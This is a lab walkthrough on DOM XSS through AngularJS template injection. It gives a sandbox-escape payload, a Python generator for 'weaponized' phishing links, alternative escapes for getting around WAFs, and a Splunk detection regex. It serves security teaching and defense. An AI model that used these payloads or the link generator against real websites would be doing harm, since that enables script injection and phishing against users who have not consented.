# Lab Walkthrough: DOM XSS in AngularJS Expression (HTML-Encoded)

* **Vulnerability Type:** Client-Side Template Injection (CSTI) / DOM-Based XSS
* **Target Context:** Client-Side JavaScript (AngularJS `ng-app` Directive)
* **Skill Level:** Practitioner (Intermediate)
* **Estimated Completion Time:** 15–20 minutes
* **Lab Status:** Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]
> The methodologies, proof-of-concept (PoC) scripts, and techniques documented in this repository are strictly for educational purposes, CTF preparation, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal. The author disclaims all liability for misuse.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](https://www.google.com/search?q=%231-vulnerability-architecture--mechanism)
2. [Lab Objectives & Verification Criteria](https://www.google.com/search?q=%232-lab-objectives--verification-criteria)
3. [Step-by-Step Exploitation Flow](https://www.google.com/search?q=%233-step-by-step-exploitation-flow)
4. [Template Injection vs. Standard XSS](https://www.google.com/search?q=%234-template-injection-vs-standard-xss)
5. [Automated Exploitation Script (Python PoC)](https://www.google.com/search?q=%235-automated-exploitation-script-python-poc)
6. [Defense, Hardening & Secure Coding](https://www.google.com/search?q=%236-defense-hardening--secure-coding)
7. [SIEM Detection & Telemetry Analysis](https://www.google.com/search?q=%237-siem-detection--telemetry-analysis)
8. [Troubleshooting & Diagnostic Runbook](https://www.google.com/search?q=%238-troubleshooting--diagnostic-runbook)
9. [References & Standards](https://www.google.com/search?q=%239-references--standards)

---

## 1. Vulnerability Architecture & Mechanism

Client-Side Template Injection (CSTI) occurs when a web application uses a client-side JavaScript framework (like AngularJS, Vue.js, or older React patterns) that dynamically parses the DOM for template expressions *after* the initial HTML has been rendered by the server.

* **The Core Flaw:** The backend server safely HTML-encodes user input (converting `<` to `&lt;` and `"` to `&quot;`), successfully preventing standard HTML injection. However, it reflects that encoded input inside an HTML element governed by the `ng-app` directive. When AngularJS loads on the client side, it scans the DOM, ignores the HTML encoding, and executes anything wrapped in double curly braces `{{ }}` as a JavaScript expression.
* **The Sandbox Bypass:** AngularJS implements a "sandbox" to prevent template expressions from executing arbitrary JavaScript (like `window.alert`). To achieve XSS, attackers must break out of this sandbox. By accessing the `constructor` property of an angular scope object (like `$on`), the attacker gains access to the native JavaScript `Function` object, which compiles and executes raw code outside the sandbox's restrictions.
* **Real-World Analogy:** Imagine a secure prison (HTML encoding) where the guards confiscate all physical weapons (angle brackets). However, the prisoners have a permitted secure phone line (AngularJS `{{}}`). If a prisoner knows the exact bypass code (the sandbox escape), they can use that permitted phone line to call the outside world and order a helicopter escape (arbitrary JS execution), completely bypassing the physical prison guards.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                        ANGULARJS CSTI EXECUTION FLOW                   │
└────────────────────────────────────────────────────────────────────────┘

  [1. Attacker Request] 
  GET /?search={{$on.constructor('alert(1)')()}}
           │
           ▼
  [2. Server Backend (Sanitization)]
  Encodes < > " '. Renders input safely into the DOM.
  <body ng-app> <h1>Search: {{$on.constructor('alert(1)')()}}</h1> </body>
           │
           ▼
  [3. Client Browser Load]
  Browser renders the HTML safely. No standard XSS triggers.
           │
           ▼
  [4. AngularJS Bootstrapping]
  AngularJS scans the DOM for 'ng-app'. It finds the {{ }} expression.
           │
           ▼
  [5. Sandbox Escape & Execution]
  Angular parses $on.constructor -> Creates native JS Function('alert(1)').
  The trailing () executes it. XSS achieved.

```

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The blog search functionality (`/?search=`).
* **Primary Objective:** Bypass backend HTML encoding by leveraging an AngularJS expression to execute the `alert()` function.
* **Validation Signal:** The lab is marked solved when the `alert(1)` pop-up executes in the browser context upon searching.

---

## 3. Step-by-Step Exploitation Flow

### Phase 1: Reconnaissance & Encoding Verification

* Navigate to the target search bar.
* Input a standard XSS tracking payload containing dangerous characters: `<script>alert("CyberTest")</script>`
* View the page source (or use Burp Suite HTTP History).
* *Observation 1:* The server safely encoded the input: `&lt;script&gt;alert(&quot;CyberTest&quot;)&lt;/script&gt;`. Standard XSS is mitigated.
* *Observation 2:* Looking higher up in the DOM structure (usually the `<body>` or `<html>` tag), you observe the `ng-app` attribute. This indicates AngularJS is active and monitoring the page structure.

### Phase 2: Payload Construction & Sandbox Escape

* Because standard HTML tags are neutralized, we must pivot to AngularJS template syntax `{{ }}`.
* Depending on the AngularJS version (usually 1.1.5 through 1.5.11), specific sandbox escapes are required.
* **Payload Breakdown:** `{{$on.constructor('alert(1)')()}}`
* `{{ ... }}`: Instructs Angular to evaluate the expression.
* `$on`: An Angular scope object available in the template.
* `.constructor`: Navigates up the prototype chain to the native `Function` constructor.
* `('alert(1)')`: Passes the malicious string into the Function constructor.
* `()`: Invokes the newly created function immediately.



### Phase 3: Injection & Execution

* Enter the constructed payload into the search box: `{{$on.constructor('alert(1)')()}}`
* Click **Search**.
* *Result:* The URL updates to `/?search=%7B%7B%24on.constructor%28%27alert%281%29%27%29%28%29%7D%7D`. The server reflects it, Angular parses it, and the alert box triggers.

---

## 4. Template Injection vs. Standard XSS

Understanding the execution context is critical for bypassing modern WAFs and server-side filters.

| Feature | Standard Reflected XSS | Client-Side Template Injection (CSTI) |
| --- | --- | --- |
| **Execution Engine** | Browser HTML Parser | Client-Side JS Framework (Angular/Vue) |
| **Required Syntax** | HTML Tags (`<script>`, `<img>`) | Template Braces (`{{ }}`, `${ }`) |
| **Impact of HTML Encoding** | **Neutralizes the attack.** | **Irrelevant.** (Framework reads raw text from DOM) |
| **Payload Complexity** | Low | High (Requires framework-specific sandbox escapes) |

---

## 5. Automated Exploitation Script (Python PoC)

In red teaming operations, attackers automate the generation of weaponized CSTI URLs for spear-phishing.

```python
#!/usr/bin/env python3
"""
AngularJS CSTI Weaponized Link Generator (PoC)
Generates URL-encoded payloads targeting the search parameter.
"""

import urllib.parse
import sys

def generate_phishing_link(target_url):
    # AngularJS sandbox escape payload
    raw_payload = "{{$on.constructor('alert(1)')()}}"
    
    # URL encode the payload to ensure safe transport over HTTP
    encoded_payload = urllib.parse.quote(raw_payload)
    
    # Construct the final weaponized URL
    weaponized_link = f"{target_url}/?search={encoded_payload}"
    
    print("[*] Generating Weaponized AngularJS CSTI Link...")
    print(f"[+] Distribute this URL to target: \n{weaponized_link}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 angular_csti_gen.py <target_base_url>")
        sys.exit(1)
        
    target = sys.argv[1].rstrip('/')
    generate_phishing_link(target)

```

---

## 6. Defense, Hardening & Secure Coding

Server-side sanitization is completely blind to this vulnerability class. Defense must be implemented at the framework architecture level.

* **Disable AngularJS parsing on untrusted nodes:** Use the `ng-non-bindable` directive on any HTML element that reflects user-supplied data. This instructs AngularJS to ignore `{{ }}` expressions within that block.
* *Secure:* `<div ng-non-bindable>Search results for: {{ userInput }}</div>`


* **Avoid Server-Side Reflection into Client-Side Templates:** Never mix server-side rendering (e.g., PHP, Jinja, ERB) with client-side templating (Angular, Vue). Serve static HTML templates and populate them strictly via JSON API calls.
* **Framework Upgrades:** Migrate away from AngularJS (v1.x) to modern Angular (v2+), which utilizes Ahead-of-Time (AOT) compilation and strict contextual escaping to structurally eliminate dynamic template evaluation at runtime.

---

## 7. SIEM Detection & Telemetry Analysis

Detecting CSTI requires adjusting Web Application Firewall (WAF) rules to look for template syntax rather than HTML tags.

### Splunk Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined 
| regex uri_query="(?i)(%7B%7B|\{\{).*?(constructor|%24on|eval|alert|%24eval|%24apply).*?(%7D%7D|\}\})"
| stats count by src_ip, uri_path, uri_query
| where count > 0

```

*Indicator of Attack (IoA):* Monitor for double curly braces (`{{` or URL encoded `%7B%7B`) combined with JavaScript prototype keywords (`constructor`, `__proto__`, `$eval`) in URL query parameters.

---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **Payload appears literally on screen (No alert)** | AngularJS version mismatch or `ng-non-bindable`. | AngularJS sandbox escapes are highly version-specific. If `$on.constructor` fails, try `$eval`, `orderBy`, or `$event.view.alert(1)`. Verify the version using the browser console: `angular.version`. |
| **Console Error: `$on is not defined**` | Scope restriction. | Not all objects are available in all scopes. Try pivoting to `toString.constructor.prototype.charAt=[].join;` or other version-specific escapes. |
| **WAF blocks the request** | Braces trigger generic rules. | Some strict WAFs block `{}`. Obfuscation might be required depending on how the backend framework decodes URL parameters. |

---

## 9. References & Standards

* [PortSwigger: Client-Side Template Injection](https://www.google.com/search?q=https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection)
* [OWASP: Testing for Client-Side Template Injection](https://www.google.com/search?q=https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Client-side_Template_Injection)
* [PayloadsAllTheThings: AngularJS XSS](https://www.google.com/search?q=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%2520Injection%23angularjs-xss)

---

> **Key Insight:** A security control is only as strong as its execution context. Server-side HTML encoding flawlessly prevents the browser's native HTML parser from executing code, but it is completely bypassed the moment a secondary execution engine (like AngularJS) steps in to evaluate the raw DOM text. Understanding the order of operations in data rendering is critical for both exploitation and defense.
